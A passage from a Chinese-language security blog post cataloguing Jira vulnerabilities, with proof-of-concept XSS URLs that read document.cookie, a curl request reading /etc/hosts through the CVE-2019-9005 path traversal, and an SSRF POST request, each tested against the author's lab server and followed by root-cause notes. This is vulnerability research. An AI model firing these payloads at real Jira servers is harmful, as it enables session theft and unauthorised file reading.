class="name">TheSchedulerBackup</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="CVE-2019-3402：-Jira-XSS-in-the-labels-gadget"><a href="#CVE-2019-3402：-Jira-XSS-in-the-labels-gadget" class="headerlink" title="CVE-2019-3402：[Jira]XSS in the labels gadget"></a>CVE-2019-3402：[Jira]XSS in the labels gadget</h3><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">https://jira.test.com/secure/ConfigurePortalPages!default.jspa?view=search&amp;searchOwnerUserName=x2rnu%3Cscript%3Ealert(1)%3C%2fscript%3Et1nmk&amp;Search=Search</div><div class="line">ConfigurePortalPages.jspa</div></pre></td></tr></table></figure>
+<p>页面的searchOwnerUserName参数的反射型XSS。</p>
+<p><img src="https://img-blog.csdnimg.cn/20190815103008754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>需要对<code>searchOwnerUserName</code>进行过滤。</p>
+<h4 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h4><ul>
+<li><a href="https://jira.atlassian.com/browse/JRASERVER-69243" target="_blank" rel="external">https://jira.atlassian.com/browse/JRASERVER-69243</a></li>
+</ul>
+<h3 id="CVE-2019-3400：-Jira-XSS-in-the-labels-gadget"><a href="#CVE-2019-3400：-Jira-XSS-in-the-labels-gadget" class="headerlink" title="CVE-2019-3400：[Jira]XSS in the labels gadget"></a>CVE-2019-3400：[Jira]XSS in the labels gadget</h3><p>PoC：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><div class="line">http://cqq.com:8091/plugins/servlet/gadgets/ifr?url=http://cqq.com:8091/rest/gadgets/1.0/g/com.atlassian.jira.gadgets:labels-gadget/gadgets/labels-gadget.xml&amp;up_projectid=../../../../../rest/gadget/1.0/issueTable/jql%3fjql=issuekey%253e1%2520OR%2520issuekey%2521=%2522%253cimg%2520src=x%2520onerror=alert(document.cookie)%253e%2522%26&amp;up_isConfigured=true</div></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/2019051418095790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>首先，这个ifr这个gadget的功能就是跟上一个url参数，然后载入这个url页面：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><div class="line">http://cqq.com:8091/plugins/servlet/gadgets/ifr?url=</div></pre></td></tr></table></figure>
+<p>然后</p>
+<figure class="highlight"><table><tr><td class="code"><pre><div class="line">http://cqq.com:8091/rest/gadget/1.0/issueTable/jql?jql=issuekey%3E1%20OR%20issuekey%21=%22%3Cimg%20src=x%20onerror=alert(document.cookie)%3E%22</div></pre></td></tr></table></figure>
+<p>issueTable这个gadget会反射用户的输入，由于响应的Content-Type为<code>application/json</code>，不能直接利用。<br><img src="https://img-blog.csdnimg.cn/20190514181906174.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>然后，</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><div class="line"><span class="attribute">http://cqq.com:8091/rest/gadgets/1.0/g/com.atlassian.jira.gadgets:labels-gadget/gadgets/labels-gadget.xml</span></div></pre></td></tr></table></figure>
+<p>可以直接访问，而且其中有一段：<br><img src="https://img-blog.csdnimg.cn/20190514183059910.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>We can actually control the <code>this.getPref(&quot;projectid&quot;)</code> since the <code>ifr</code>-gadget allows you to provide parameters called <code>up_X</code> where X could be <code>projectid</code> and <code>this.getPref(&quot;projectid&quot;)</code> would then return that information. </p>
+<h4 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h4><ul>
+<li><a href="https://jira.atlassian.com/browse/JRASERVER-69245" target="_blank" rel="external">https://jira.atlassian.com/browse/JRASERVER-69245</a></li>
+</ul>
+<h3 id="CVE-2018-20824：-Jira-XSS-in-WallboardServlet-through-the-cyclePeriod-parameter"><a href="#CVE-2018-20824：-Jira-XSS-in-WallboardServlet-through-the-cyclePeriod-parameter" class="headerlink" title="CVE-2018-20824：[Jira]XSS in WallboardServlet through the cyclePeriod parameter"></a>CVE-2018-20824：[Jira]XSS in WallboardServlet through the cyclePeriod parameter</h3><p>PoC：<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">/plugins/servlet/Wallboard/?dashboardId=10100&amp;dashboardId=10101&amp;cyclePeriod=(function()&#123;alert(document.cookie);return%2030000;&#125;)()&amp;transitionFx=none&amp;random=true</div></pre></td></tr></table></figure></p>
+<p>步骤：<br><img src="https://img-blog.csdnimg.cn/20190514032510902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2019051403252121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190514032529834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190514032538494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看前端源码，搜索关键字：<br><code>AJS.WALLBOARD.cycleOptions</code><br><img src="https://img-blog.csdnimg.cn/20190514032600229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>但是利用条件是</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> (AJS.WALLBOARD.wallboards.children().size() &gt;= <span class="number">2</span>)</div></pre></td></tr></table></figure>
+<p>即存在两个或以上的wallboards。</p>
+<h4 id="参考-3"><a href="#参考-3" class="headerlink" title="参考"></a>参考</h4><ul>
+<li><a href="https://jira.atlassian.com/browse/JRASERVER-69238" target="_blank" rel="external">https://jira.atlassian.com/browse/JRASERVER-69238</a></li>
+<li><a href="https://duncanhalley.co.uk/blog/building-a-wallboard-in-jira/" target="_blank" rel="external">https://duncanhalley.co.uk/blog/building-a-wallboard-in-jira/</a></li>
+</ul>
+<h3 id="CVE-2019-9005-Jira-路径穿越The-Cprime-Power-Scripts-app"><a href="#CVE-2019-9005-Jira-路径穿越The-Cprime-Power-Scripts-app" class="headerlink" title="CVE-2019-9005:[Jira]路径穿越The Cprime Power Scripts app"></a>CVE-2019-9005:[Jira]路径穿越The Cprime Power Scripts app</h3><p>影响版本：<br>Cprime Power Scripts app &lt; 4.0.14<br>CVSS v3分数：6.5</p>
+<p>漏洞描述：</p>
+<blockquote>
+<p>The Power Scripts addon implements a REST API which offers several endpoints for different functionalities. The wfviewer/filecheck and wfviewer/filecontent endpoints, which are used by administrators to check and read local files were found to not check the authorization of the calling user, allowing any authenticated user to probe for and read files from the JIRA server filesystem.</p>
+</blockquote>
+<p>未做好权限控制，导致任意认证的用户访问/读取JIRA服务器文件系统的任意文件。</p>
+<p>环境搭建：<br>这个插件是下载到jira的home目录下。<br><img src="https://img-blog.csdnimg.cn/20190508153339923.png" alt="在这里插入图片描述"></p>
+<p>现在刚下载的这个最新版的插件是不存在漏洞的。要找存在漏洞的版本，需要去：<br><a href="https://marketplace.atlassian.com/apps/43318/power-scripts-jira-script-automation/version-history" target="_blank" rel="external">https://marketplace.atlassian.com/apps/43318/power-scripts-jira-script-automation/version-history</a></p>
+<p><img src="https://img-blog.csdnimg.cn/20190508155042945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>安装</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">cp power-scripts-4.0.13-r20180321150605.jar /Users/caiqiqi/jiraHome-7.13.0/plugins/installed-plugins/</div></pre></td></tr></table></figure>
+<p>完成之后（实际是我从官网下载的）使用以下命令，这里的用户名密码是普通用户的，使用-u参数，可以将用户名密码进行base64编码，作为HTTP头，<br><figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">curl -s -u dev2:dev2 &quot;http://cqq.com:8091/rest/keplerrominfo/jjupin/2.0/wfviewer/filecontent?path=/etc/hosts&quot;</div></pre></td></tr></table></figure></p>
+<p>PoC来源：<a href="https://www.detack.de/en/cve-2019-9005" target="_blank" rel="external">https://www.detack.de/en/cve-2019-9005</a><br>实际发出的请求为：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><div class="line"><span class="keyword">GET</span> <span class="string">/rest/keplerrominfo/jjupin/2.0/wfviewer/filecontent?path=/etc/hosts</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: cqq.com:8091</div><div class="line"><span class="attribute">Authorization</span>: Basic ZGV2MjpkZXYy</div><div class="line"><span class="attribute">User-Agent</span>: curl/7.54.0</div><div class="line"><span class="attribute">Accept</span>: */*</div><div class="line"><span class="attribute">Connection</span>: close</div></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20190509104338223.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190509105507738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190509111826520.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">Files.readAllBytes(Paths.get(filePath))</div></pre></td></tr></table></figure>
+<p>得到指定路径的文件内容，然后将其中的<code>\n</code>替换成<code>&lt;br&gt;</code>，然后放到响应中返回。</p>
+<h3 id="CVE-2018-13404：-Jira-VerifyPopServerConnection功能SSRF"><a href="#CVE-2018-13404：-Jira-VerifyPopServerConnection功能SSRF" class="headerlink" title="CVE-2018-13404：[Jira]VerifyPopServerConnection功能SSRF"></a>CVE-2018-13404：[Jira]VerifyPopServerConnection功能SSRF</h3><p>来源：<a href="https://jira.atlassian.com/browse/JRASERVER-68527" target="_blank" rel="external">https://jira.atlassian.com/browse/JRASERVER-68527</a><br>描述为：</p>
+<blockquote>
+<p>allows remote attackers who have administrator rights to determine the existence of internal hosts &amp; open ports and in some cases obtain service information from internal network resources via a Server Side Request Forgery (SSRF) vulnerability</p>
+</blockquote>
+<p>由于需要管理员权限才能利用，危害较低，只有4分：<br><img src="https://img-blog.csdnimg.cn/20190507192401639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190507163613383.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight http"><table><tr><td class="code"><pre><div class="line"><span class="keyword">POST</span> <span class="string">/secure/admin/VerifySmtpServerConnection!add.jspa</span> HTTP/1.1</div><div class="line"><span class="attribute">Host</span>: cqq.com:8091</div><div class="line"><span class="attribute">Content-Length</span>: 300</div><div class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</div><div class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3760.0 Safari/537.36</div><div class="line"><span class="attribute">Cookie</span>: NX-ANTI-CSRF-TOKEN=909f8912-966b-4146-845c-bd4afbb342a9; JSESSIONID.a8dacec0=40k4rm1bg41cq0iz0pk06mw; screenResolution=1680x1050; jenkins-timestamper-offset=-28800000; JSESSIONID.ea565973=node0gs7qzwbwbve61rkcov30n71s56.node0; JSESSIONID.7fff2687=node0qm94g8n471v01guwzr3cy7gur6.node0; JSESSIONID.97de572c=1sd5yqku2s4amea1xvrtr6t8q; pgv_info=ssid=s2748431704; pgv_pvid=2487547493; ts_uid=9932210140; ADMINCONSOLESESSION=n1FCcBGb0SJfNrcMQhps1LXycQWMpvVhwQKn123nzbs1xqS6hbvf!1714415663; atlassian.xsrf.token=BBAN-C0N2-UEHO-M2OJ_7978bcc6c6a3a10bcc73fd8d695f73c34f82fb40_lin; AJS.conglomerate.cookie="|hipchat.inapp.links.first.clicked.cqq=false"; JSESSIONID=F2B9D75D0B3108F1E70D18CD81CFBD28</div><div class="line"><span class="attribute">Connection</span>: close</div><div class="line"></div><div class="line"><span class="bash">name=<span class="built_in">test</span>SMTP&amp;description=<span class="built_in">test</span>SMTP&amp;from=admin%40cqq.com&amp;prefix=mdl_&amp;serviceProvider=custom&amp;protocol=smtp&amp;serverName=192.168.170.139&amp;port=4444&amp;timeout=10000&amp;username=cqq&amp;changePassword=<span class="literal">true</span>&amp;password=cqq&amp;jndiLocation=&amp;<span class="built_in">type</span>=smtp&amp;atl_token=BBAN-C0N2-UEHO-M2OJ_7978bcc6c6a3a10bcc73fd8d695f73c34f82fb40_lin</span></div></pre></td></tr></table></figure>
+<p>若不提供管理员Cookie无法利用：<br><img src="https://img-blog.csdnimg.cn/20190507163534161.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>参考了一下jira的开发文档，知道了一般url后缀对应的是do某方法，然后url前面的是对应的Java的类，所以可以在<br><code>atlassian-jira-software-7.13.0-standalone/atlassian-jira/WEB-INF/atlassian-bundled-plugins/jira-mail-plugin-10.0.13.jar!/com/atlassian/jira/plugins/mail/webwork/VerifySmtpServerConnection#doAdd</code><br>下断点。</p>
+<p>调用栈如下：<br><img src="https://img-blog.csdnimg.cn/20190507192030807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最终调用<code>atlassian-jira-software-7.13.0-standalone/atlassian-jira/WEB-INF/atlassian-bundled-plugins/base-hipchat-integration-plugin-7.10.3.jar!/javax/mail/Service#connect</code>调用这一句：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><div class="line">connected = <span class="keyword">this</span>.protocolConnect(host, port, user, password);</div></pre></td></tr></table></figure>
+<p>参考：<a href="https://docs.oracle.com/javaee/7/api/javax/mail/Service.html#connect-java.lang.String-int-java.lang.String-java.lang.String-" target="_blank" rel="external">https://docs.oracle.com/javaee/7/api/javax/mail/Service.html#connect-java.lang.String-int-java.lang.String-java.lang.String-</a></p>
+<p><img src="https://img-blog.csdnimg.cn/2019050719221889.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2NhaXFpaXFp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>完成TCP请求.</p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2019/11/03/Atlassian-Confluence漏洞大杂烩/" data-toggle="tooltip" data-placement="top" title="Atlassian Confluence漏洞大杂烩">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2019/11/03/Apache-Solr漏洞合集/" data-toggle="tooltip" data-placement="top" title="Apache Solr漏洞合集">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#Atlassian" title="Atlassian">Atlassian</a>
+                        
+                          <a class="tag" href="/tags/#Jira" title="Jira">Jira</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+                    <li>
+                        <a target="_blank" href="http://weibo.com/2963784630">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/caiqiqi">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; caiqiqi 2019 
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a> | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://github.com/caiqiqi/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("http://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Side Catalog -->
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://github.com/caiqiqi/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
